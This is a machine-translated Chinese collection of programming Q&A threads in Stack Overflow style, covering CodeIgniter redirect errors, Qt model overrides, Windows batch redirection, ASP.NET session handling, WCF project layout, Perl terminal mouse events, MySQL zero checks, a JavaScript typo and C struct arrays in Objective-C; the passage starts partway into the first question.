消息：无法修改标头信息 - 标头已发送（输出开始于 /home/websites/public_html/application/controllers/user.php:64）

文件名：helpers/url_helper.php

行号：546

这是我的代码

```
function register()
{
                     $email=$_POST['email'];
                    $pass=$_POST['pass'];
                     $cpass=$_POST['cpass'];
            $valid = array(
                                    array(
                                        'field'   => 'email',
                                        'label'   => 'Username(Email)',
                                        'rules' => 'trim|required|valid_email|is_unique[register.email]'
                                    ), 
                                    array(
                                        'field'   => 'pass',
                                        'label'   => 'Password',
                                        'rules'   => 'trim|required||matches[cpass]|min_length[8]|max_length[30]|'
                                    ),
                                    array(
                                        'field'   => 'cpass',
                                        'label'   => 'Confirm Password',
                                        'rules'   => 'trim|required'
                                    )
                            );
                $this->form_validation->set_rules($valid); 
        $this->form_validation->set_error_delimiters('<div class="error_txt">', '</div>');
        if ($this->form_validation->run() == FALSE)
        {
            echo "error";
            redirect('/home/'); 
        }
        else
        {

            $this->load->model('User_model');       
            $rs=$this->User_model->register($_POST);

            redirect('/home/'); 
        }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T13:33:29.097

它可能发生在这里：

回声“错误”；

而是尝试将错误返回给调用者，然后从视图中显示错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-21T16:20:51.077

`redirect``Location`实际上向浏览器发送标头。

您的输出已经开始。服务器必须在任何输出开始之前发送标头。您正在执行`echo`重定向之前。所以它抛出一个错误，因为它在输出开始后无法发送标头。

删除它`echo`，它应该适合你。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T15:04:25.940

不要在 ajax 调用中使用重定向。您可以使用 javascript 重定向来实现您的目标。试试这个片段：

```
if ($this->form_validation->run() == FALSE)
{
  echo "error";
}
else
{
  $this->load->model('User_model');       
  $rs=$this->User_model->register($_POST);
} 
```

在 JAVASCRIPT 中：

```
window.location = '<?php echo site_url('home'); ?>'; 
```

# c++ - 如何覆盖（重新实现）QFileSystemModel 中的成员函数

> ID：10246984
> 
> 赞同：2
> 
> 时间：2012-04-20T13:14:34.857
> 
> 标签：c++, qt, class, overriding

我已经为此苦苦挣扎了一段时间。

由于非常糟糕的图标获取算法， Qt`QFileSystemModel`在获取数百个文件时非常慢。

我想完全禁用图标。它们以`QFileSystemModel::data`非虚拟的方法获取（QFileSystemModel 的源代码可在此处获得：http: [//qt.gitorious.org/qt/qt/blobs/4.7/src/gui/dialogs/qfilesystemmodel.cpp](http://qt.gitorious.org/qt/qt/blobs/4.7/src/gui/dialogs/qfilesystemmodel.cpp)）

这是我试图运行的代码：

```
class FileModel : public QFileSystemModel {
    using QFileSystemModel::data;
public:
    QVariant QFileSystemModel::data(const QModelIndex &index, int role) const
    {
     // my own implementation here
    }
} 
```

但它失败了

`cannot define member function QFileSystemModel::data witin FileModel`

**更新**

我已经设法覆盖了该功能，这就是我现在所拥有的：

```
class FileModel : public QFileSystemModel {
public:
    QVariant data(const QModelIndex &index, int role) const
    {
    // Here goes Qt's implementation
    Q_D(const QFileSystemModel);
    if (!index.isValid() || index.model() != this)
        return QVariant();
    switch (role) {
    case Qt::EditRole:
    case Qt::DisplayRole:
        switch (index.column()) {
        case 0: return d->name(index);
        case 1: return d->size(index);
        case 2: return d->type(index);
        case 3: return d->time(index);
        default:
            qWarning("data: invalid display value column %d", index.column());
            break;
        }
        break;
    case FilePathRole:
        return filePath(index);
    case FileNameRole:
        return d->name(index);
    case Qt::DecorationRole:
        if (index.column() == 0) {
            QIcon icon = d->icon(index); // This is the part I need to change
            if (icon.isNull()) {
                if (d->node(index)->isDir())
                    icon = d->fileInfoGatherer.iconProvider()->icon(QFileIconProvider::Folder);
                else
                    icon = d->fileInfoGatherer.iconProvider()->icon(QFileIconProvider::File);
            }
            return icon;
        }
        break;
    case Qt::TextAlignmentRole:
        if (index.column() == 1)
            return Qt::AlignRight;
        break;
    case FilePermissions:
        int p = permissions(index);
        return p;
    }
    return QVariant();
}
}; 
```

但是，此代码无法编译。这是我得到的错误： `'const QFileSystemModelPrivate* QFileSystemModel::d_func() const' is private`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T13:27:34.423

看起来这是意料之中的，因为有一种设置“图标提供者”的方法：

[http://doc.qt.io/archives/qt-4.7/qfilesystemmodel.html#setIconProvider](http://doc.qt.io/archives/qt-4.7/qfilesystemmodel.html#setIconProvider)

参数 a`QFileIconProvider`看起来是一个相当简单的类，您可以实现自己的实例，并使用从 a 获取图标`QFileInfo`（基本上是文件名）的方法：

[http://doc.qt.io/archives/qt-4.7/qfileinfo.html](http://doc.qt.io/archives/qt-4.7/qfileinfo.html)

您可以实现其中一个，只为所有内容返回相同的图标。如果你发现这不能解决你的问题，下面的编译对我来说很好...... FWIW：

```
class FileModel : public QFileSystemModel {
public:
    QVariant data(const QModelIndex &index, int role) const
    {
        if (role == Qt::DecorationRole) {
            return QVariant (QIcon ());
        }    

        return QFileSystemModel::data(index, role);
    }
}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T14:25:00.370

如果基类中的函数是虚函数，那么它在派生类中也是虚函数。以下将打印“C”：

```
#include <iostream>

class A {
public:
  virtual void data() = 0;
};

class B: public A {
public:
  void data() { std::cout << "B\n"; }
};

class C: public B {
public:
  void data() { std::cout << "C\n"; }
};

int
main() {
  C c;
  A *a = &c;
  a->data();

  return 0;
} 
```

`QFileSystemDialog`派生自`QAbstractItemModel`其中`data()`是纯虚的。如果它没有`data()`用自己的实现覆盖，你甚至不能使前者实例化。

见[http://qt-project.org/doc/qt-4.8/qabstractitemmodel.html#data](http://qt-project.org/doc/qt-4.8/qabstractitemmodel.html#data)

# c++ - 批处理文件不适用于启动命令

> ID：10246987
> 
> 赞同：1
> 
> 时间：2012-04-20T13:14:56.083
> 
> 标签：c++, command-line, batch-file

我需要从执行 .exe 应用程序的 C++ 运行批处理文件，.exe 是一个名为 dumpedid 的免费程序，它将监视器的 edid 写入文本文件。我使用了 CreateProcess，只要批处理文件不使用启动命令，它就可以工作

```
"DumpEDID.exe" > "edid.txt" // this works
start /wait /d "DumpEDID.exe" > "edid.txt" // this doesn't 
```

但是我想使用 /wait 命令，所以这是一个问题。这可能只是应用程序本身的问题吗？我运行批处理文件的代码如下

```
std::ofstream fs;
fs.open(DUMP_EDID_BATCH_FILE_PATH);
fs << "\"" << DUMP_EDID_EXE_PATH << "\" > \"" << DUMP_EDID_TXT_FILE_PATH << "\"";
fs.close();

STARTUPINFOA si;
PROCESS_INFORMATION pi;

ZeroMemory( &si, sizeof(si) );
si.cb = sizeof(si);
ZeroMemory( &pi, sizeof(pi) );

std::string str = (std::string)"/c " + "\"" + DUMP_EDID_BATCH_FILE_PATH + "\"";
char * cmdLine = new char[str.size() + 1];
strncpy(cmdLine,str.c_str(), str.size());
cmdLine[str.size()] = '\0';

if( !CreateProcessA( "c:\\Windows\\system32\\cmd.exe", 
    cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) ) 
{
    delete[] cmdLine;
    DWORD errCode = GetLastError();
    g_log.Info(_T("CreateProcess failed - error code %d"), errCode);
    return errCode;
}

delete[] cmdLine;

WaitForSingleObject( pi.hProcess, INFINITE );

CloseHandle( pi.hProcess );
CloseHandle( pi.hThread ); 
```

谢谢。

编辑 - 我只是尝试直接从命令行运行批处理文件，我注意到一些奇怪的东西，批处理文件的内容是

开始 /wait /d "D:...\dumpedid" > "D:...\edid.txt"

但是当我运行批处理文件时出现的命令是

开始 /wait /d "D:...\dumpedid" 1>"D:...\edid.txt"

注意 > 符号前的 1 和 1 前的额外空格

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-21T07:40:26.250

`start`有两点需要注意。

title 选项是第一个引用的参数，所以如果你有一个引用的 cmd 你还需要一个 title 选项。
`start "myTitle" /start "cmd"`

如果您尝试重定向输出，您需要转义重定向，因为*正常*重定向将重定向命令的输出而`start`不是启动的命令！

`start "" /wait /d "DumpEDID.exe" ^> "edid.txt"`

# asp.net-mvc - 需要在 mvc3 中使用 foreach 从 Session 对象中检索值吗？

> ID：10246988
> 
> 赞同：0
> 
> 时间：2012-04-20T13:14:58.140
> 
> 标签：asp.net-mvc, asp.net-mvc-2

我有 mvc 3 应用程序，其中在会话对象中我将我需要的所有值作为参数来执行存储过程。

如果 userAction 是更新，则执行存储过程。

```
public ActionResult Index(string userAction) 
{ 
   if(Session["Mappings"] != null)            
        ViewData["Message"] = "Mapping web grid"; 

    if (Session["PricingSecurities"] == null) 
        Session["PricingSecurities"] = objRepository.GetPricingSecurityID(); 
    if (Session["Cusips"] == null) 
        Session["Cusips"] = objRepository.GetCUSIP(); 

    SecurityMappingModel objModel = null; 
    mappings = (List<SecurityMappingModel>)Session["Mappings"]; 

    objModel = new SecurityMappingModel(); 

    if (userAction == "Update" ) 
    { 
        //help me to fix this code 

        //foreach (var item in Session)
        //{Session["Mappings"] //NEED FIX HERE
        //}
        // PLEASE HELP ME TO RETRIEVE SESSION VALUES
        return RedirectToAction("Index"); 
    } 
    return View(objModel); 
} 
```

我如何检索会话的所有值 [“映射”] 它持有 3 个条目 3ids、3cusips、3 计算

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:24:24.273

简短的回答是不要`var`用作您的枚举类型，`object`而是使用。

```
foreach (obj item in Session) {
    if (item is CUSIP) {
        // CUSIP processing
    } else if (item is PricingSecurity) {
        //Pricing security processing
    } //etc.
} 
```

如您所见，这种方法的问题是您必须测试每个对象的类型，以便对其执行任何自定义操作。一个更好的主意是创建自己的类来存储在会话中：

```
public class SessionData()
{
    List<CUSIP> Cusips {get;set;}
    List<PricingSecurity> PricingSecurities {get;set;}

    public SessionData()
    {
        // Initialize the lists so they are never null
        this.Cusips = new List<CUSIP>();
        this.PricingSecurities = new List<PricingSecurity>();
    }
} 
```

然后，您可以遍历每个列表属性并执行您需要的任何操作。

# .net - 将 WCF 服务解决方案拆分为 2 个程序集，1 个用于合同，1 个用于实现有什么优势？

> ID：10246990
> 
> 赞同：0
> 
> 时间：2012-04-20T13:15:00.427
> 
> 标签：.net, wcf, architecture

[**本文**](http://www.codeproject.com/Articles/51063/Setting-up-a-Project-framework-for-a-WCF-Solution)建议将 WCF 服务解决方案拆分为 2 个项目，1 个用于合同程序集，1 个用于实现程序集。

为什么这是有利的？我能从这次分裂中得到什么？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:49:46.633

明显的优势是您可以将服务合同 dll 文件共享给您的客户。当您在客户端和服务器之间共享一个公共服务合同 dll 时，您的客户端可以使用`ChannelFactory`该类的服务。

```
ChannelFactory<IHelloWorld> channel = new ChannelFactory<IHelloWorld>("tcp"); 
```

*（客户端可以使用 WCF 服务的两种不同方式。（[在 WCF 中使用 ChannelFactory 与代理](http://blogs.msdn.com/b/juveriak/archive/2008/02/03/using-channels-vs-proxies-in-wcf.aspx)）*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:25:42.633

一般来说（不是专门针对 WCF 服务），从设计的角度来看，将接口与实现分开是一种很好的做法。

但是，对于 WCF 服务，您必须注意这一点：如果接口项目包括服务方法使用的对象的接口，则 WCF 服务接口不应成为接口项目的一部分，而应在实现项目中定义。这样做的原因是 WCF 服务操作不应在其方法签名中使用接口类型，因为接口类型不能序列化（以可互操作的方式）。它们应该使用实现类型，因此它们应该是实现项目的一部分，因为否则您需要将接口项目中的引用添加到实现项目中。那将是糟糕的设计，并且会使接口与实现的分离变得毫无用处。

# perl - Term::TermKey：捕捉鼠标事件和按键的正确方法是什么？

> ID：10246992
> 
> 赞同：0
> 
> 时间：2012-04-20T13:15:08.753
> 
> 标签：perl, terminal, mouseevent, libtermkey

这适用于按键，但不适用于鼠标点击。我应该在此处更改什么以使其正常工作（[Term::TermKey](http://search.cpan.org/perldoc?Term%3a%3aTermKey)）？

```
#!/usr/bin/env perl
use warnings;
use 5.12.0;
use utf8;
use Term::TermKey qw(FLAG_UTF8);
my $tk = Term::TermKey->new( \*STDIN );
binmode STDOUT, ':encoding(utf-8)' if $tk->get_flags & FLAG_UTF8;

while( 1 ) {
    my $key;
    $tk->waitkey( $key );

    if ( $key->type_is_mouse ) {
        my ( $ev, $button, $line, $col ) = $tk->interpret_mouse( $key );
        say "event : $ev";
        say "button: $button";
        say "line  : $line";
        say "col   : $col";
    }
    else {
        say "<", $tk->format_key( $key, 0 ), ">";
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T14:13:17.133

当我激活鼠标模式时，它可以工作。

```
#!/usr/bin/env perl
use warnings;
use 5.12.0;
use utf8;
use Term::TermKey qw(FLAG_UTF8);
my $tk = Term::TermKey->new( \*STDIN );
binmode STDOUT, ':encoding(utf-8)' if $tk->get_flags & FLAG_UTF8;

$|++;

print "\e[?1003h";

say "Quit with \"q\"";
while( 1 ) {
    my $key;
    $tk->waitkey( $key );

    if ( $key->type_is_mouse ) {
        my ( $ev, $button, $line, $col ) = $tk->interpret_mouse( $key );
        say "event : $ev";
        say "button: $button";
        say "line  : $line";
        say "col   : $col";
    }
    else {
        say "<", $tk->format_key( $key, 0 ), ">";
        last if $tk->format_key( $key, 0 ) eq 'q';
    }
}

print "\e[?1003l"; 
```

# mysql - mysql - 像 isnull() 这样的函数来检查零值

> ID：10246993
> 
> 赞同：4
> 
> 时间：2012-04-20T13:15:11.713
> 
> 标签：mysql, substring, zero, isnull

我正在寻找一个函数来检查列是否具有与该函数类似的值 0 `isnull()`。

这是我到目前为止所得到的：

```
CONCAT(
    SUBSTRING_INDEX(
        SUBSTRING(textCol, 1, 
            LOCATE(DATE_FORMAT(dateCol,'%d.%m.%Y  %H:%i'), textCol)-1),
            '|',
             -1),       
    SUBSTRING(
        textCol,
        LOCATE(DATE_FORMAT(dateCol,'%d.%m.%Y  %H:%i'), textCol),
        IFNULL(
            LOCATE( /* this will return 0 if it's the last entry */
                '|', 
                textCol, 
                LOCATE(DATE_FORMAT(dateCol,'%d.%m.%Y  %H:%i'), textCol)
            ) - LOCATE(DATE_FORMAT(dateCol,'%d.%m.%Y  %H:%i'), textCol),
            LENGTH(textCol)))) 
```

textCol 中的数据有点像 CSV 文件，每列内都有另一个 CSV 文件。每个数据集由 分隔，`|`而其中的每个数据集由 分隔`&&`。内部字段是名称、日期`'%d.%m.%Y %H:%i'`和评论。

我想提取与我进入的某个 DATETIME 相对应的数据集`dateCol`。问题是，如果我要查找的条目是 中的最后一个条目`textCol`，则`LOCATE`（请参阅注释）返回 0。但这会破坏我`SUBSTRING`的，因此只返回条目的前半部分。

我添加了一个`ISNULL()`，这当然在这里没有做任何事情。我想做的是有一些类似于 do `ISNULL()`a的东西`ISZERO()`，很像`||`Perl 中的运算符的行为。

可能有一种更好的方法来实现我想要的。请不要犹豫告诉我。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2015-01-02T19:33:49.513

这更短并且避免重复表达：

```
SELECT COALESCE( NULLIF( expression, 0 ), 'a substitute for zero' ) FROM mytable 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2019-03-05T21:33:37.637

在这里可能有用：有一种时髦的方法来检查表达式是 NULL*还是*0：

```
IFNULL(NULLIF(expr, 0), alt_expr) 
```

如果*expr*为 NULL 或 0，则返回*alt_expr ，否则返回**expr*。

 *** * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-20T13:17:30.237

```
SELECT  CASE expression WHEN 0 THEN 'a substitute for zero' ELSE expression END
FROM    mytable 
```**

# javascript - 无法让 onclick 事件的函数在 Javascript 中工作

> ID：10246996
> 
> 赞同：0
> 
> 时间：2012-04-20T13:15:28.750
> 
> 标签：javascript, dom-events

我试图让一个`onclick`事件在一些嵌入式 Javascript 代码中工作。

在咨询了很多论坛和书籍之后，我尝试了多种不同的方法来注册事件处理程序，并修改函数中的代码以完成工作 - 仍然没有成功。

我确定这很简单，但我离它太近了，看不出问题所在！如果有人能花时间提供建议，我将不胜感激！

以下是 HTML 文档的摘录：

```
<?xml version = "1.0" encoding = "utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns = "http://www.w3.org/1999/xhtml">
<head>
<title>Order Form</title>

<script type = "text/javascript">

function updateTotal() {
    var boltQty = document.getElementbyId("bolt_quantity").value;
    var nutQty = document.getElementbyId("nut_quantity").value;
    var washQty = document.getElementbyId("wash_quantity").value;   

    document.getElementById("subtotal").value = 
    totalCost = (2.15 * boltQty) + (0.45 * nutQty) + (0.15 * washQty);
}
</script>
</head>
<body>

<h3>Order Form</h3>

<form id = "orderform" action = "">

<table border = "1" cellpadding = "3">
        <tr>
            <th colspan = "8">Product details</th>
        </tr>
        <tr>
            <th>Item</th>
            <th>Product Code</th>
            <th>Diameter</th>
            <th>Length</th>
            <th>Colour</th>
            <th>Unit Price</th>
            <th>Quantity</th>
            <th>Price</th>

        </tr>
        <tr>
            <td>Bolt</td>
            <td>B113</td>
            <td>9</td>
            <td>50</td>
            <td>Black</td>
            <td>2.15</td>
            <td><input type = "text" id = "bolt_quantity" size = "3" /></td>
            <td><input type = "text" id = "row1" onfocus = "this.blur();" size = "3" /></td>
        </tr>
        <tr>
            <td>Nut</td>
            <td>N234</td>
            <td>5</td>
            <td>n/a</td>
            <td>Silver</td>
            <td>0.45</td>
            <td><input type = "text" id = "nut_quantity" size = "3" /></td>
            <td><input type = "text" id = "row2" onfocus = "this.blur();" size = "3" /></td>
        </tr>
        <tr>
            <td>Washer</td>
            <td>W359</td>
            <td>8</td>
            <td>n/a</td>
            <td>Silver</td>
            <td>0.30</td>
            <td><input type = "text" id = "wash_quantity" size = "3" /></td>
            <td><input type = "text" id = "row3" onfocus = "this.blur();" size = "3" /></td>
        </tr>
    </table>
<p>
<input type = "button" value = "Subtotal" onclick = "updateTotal();" />
<input type = "text" size = "3" id = "subtotal" onfocus = "this.blur();" />
</p>

<p>
<input type = "submit" value = "Submit Order" />
<input type = "reset" value = "Clear Order Form" />
</p>
</form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T13:20:11.077

```
var boltQty = document.getElementbyId("bolt_quantity").value;
var nutQty = document.getElementbyId("nut_quantity").value;
var washQty = document.getElementbyId("wash_quantity").value; 
```

函数名称错误`getElementbyId`。
正确的一个是`getElementById`。

> 函数名称区分大小写。

# objective-c - 数组内存管理（不是 NSArray，而是 type[23]）

> ID：10246997
> 
> 赞同：0
> 
> 时间：2012-04-20T13:15:29.220
> 
> 标签：objective-c

我刚刚开始开发 iOS 应用程序，我的问题与简单数组有关。我的应用程序是一个游戏，大量使用了 CGPoint 结构。因为它不是一个对象，所以我不能将它直接放在一个 NSArray 中，而必须将它包装在一个 NSValue 中。这工作正常。

在其他主要是示例代码中，我看到了简单数组的用法（我猜那是 C？）：

```
CGPoint manyPoints[40];
manyPoints[0] = CGPointMake(23, 42);
// And so on... 
```

内存分配在哪里？什么时候解除分配？当我传递它时会发生什么？是抄的吗？关于ObjectiveC，我找不到关于这个主题的任何内容，但我不知道该去哪里找。

奖励问题：这与带有 NSValues 的 NSArrays 相比如何？它更快吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:29:50.097

`CGPoint`是 C 结构类型。该声明直接在堆栈上分配内存。在 C 中，您可以直接将结构作为值传递。CGPointMake() 可能看起来像这样：

```
struct CGPoint {
     CGFloat x;
     CGFloat y;
};
typedef struct CGPoint CGPoint;

 CGPoint CGPointMake(CGFloat x, CGFloat y)
 {
     CGPoint returnValue; // allocated directly on the stack
     returnValue.x = x;   // Do not confuse this with Objective-C dot notation.  It is NOT the same thing
     returnValue.y = y;
     return returnValue;
 } 
```

这是完全合法的，整个结构从堆栈中 *复制出来作为返回值。*

> 奖励问题：这与带有 NSValues 的 NSArrays 相比如何？它更快吗？

试试看，但我会告诉你答案是肯定的。没有 Objective-C 消息传递要做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:21:20.417

对 -`CGPoint`只是一个 C 结构。

> 内存分配在哪里？

如声明的那样，在堆栈上。

如果您使用过`malloc`，那么它将在堆上（除非优化出来）。

> 什么时候解除分配？

如声明的那样，当范围退出时，该区域可在堆栈上重用。

如果你`malloc`编辑它，你就必须这样`free`做。

> 当我传递它时会发生什么？是抄的吗？

这取决于你如何通过它。该语言提供了按值传递和按引用传递的选项。

> 关于ObjectiveC，我找不到关于这个主题的任何内容，但我不知道该去哪里找。

一本C书

> 奖励问题：这与带有 NSValues 的 NSArrays 相比如何？它更快吗？

堆栈分配和对象的速度要快得多，尽管它们可能会被滥用并且对所有人都有很好的用途。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T13:22:04.540

该语句*在堆栈上*`CGPoint manyPoints[40];`分配 40 ，这意味着（通常）您不能传递它们。当您离开当前堆栈帧（掉出当前的大括号集）时，数据将自动被释放。`CGPoints`

 *您还可以执行以下操作：

```
CGPoint* manyPoints = malloc(40 * sizeof(CGPoint);

// blah

manyPoints[0] = CGPointMake(23, 42);

// I'm done now
free(manyPoints); 
```

为此，您可能会更幸运地在 C（而不是 Objective C）中进行搜索。

是的，它几乎肯定会比使用`NSArray`/更快`NSValue`。*